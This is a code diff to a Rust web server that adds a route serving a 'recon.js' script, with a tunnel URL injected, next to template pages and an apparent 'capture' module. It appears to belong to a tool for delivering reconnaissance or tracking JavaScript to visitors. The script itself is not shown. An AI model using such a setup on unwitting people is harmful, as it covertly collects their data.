@@ -10,6 +10,8 @@ use tower_http::cors::{Any, CorsLayer};
 use tower_http::services::ServeDir;
 use tower_http::trace::TraceLayer;
 
+use axum::response::Response;
+
 mod api;
 mod capture;
 mod db;
@@ -163,6 +165,7 @@ async fn main() -> anyhow::Result<()> {
 
     let mut app = Router::new()
         .route("/t/:template_id", get(templates::serve_template))
+        .route("/t/recon.js", get(serve_recon_js))
         .nest("/api", api_routes);
 
     app = app.fallback_service(serve_dir);
@@ -212,4 +215,25 @@ async fn health(State(state): State<Arc<AppState>>) -> Json<HealthResponse> {
         db_connected,
         trailbase_connected: tb_connected,
     })
+}
+
+async fn serve_recon_js(State(state): State<Arc<AppState>>) -> Response {
+    let path = format!("{}/recon.js", state.templates_dir);
+    match std::fs::read_to_string(&path) {
+        Ok(content) => {
+            let api_base = std::env::var("TUNNEL_LINK").unwrap_or_default();
+            let api_url = if api_base.is_empty() { "/api".to_string() } else { format!("{}/api", api_base) };
+            let js = content
+                .replace("API_BASE_URL", &api_url)
+                .replace("forwarding_link", &api_base);
+            let mut resp = Response::new(js.into());
+            resp.headers_mut().insert(axum::http::header::CONTENT_TYPE, "application/javascript".parse().unwrap());
+            resp.headers_mut().insert(axum::http::header::CACHE_CONTROL, "no-cache".parse().unwrap());
+            resp
+        }
+        Err(_) => Response::builder()
+            .status(axum::http::StatusCode::NOT_FOUND)
+            .body("recon.js not found".into())
+            .unwrap()
+    }
 }
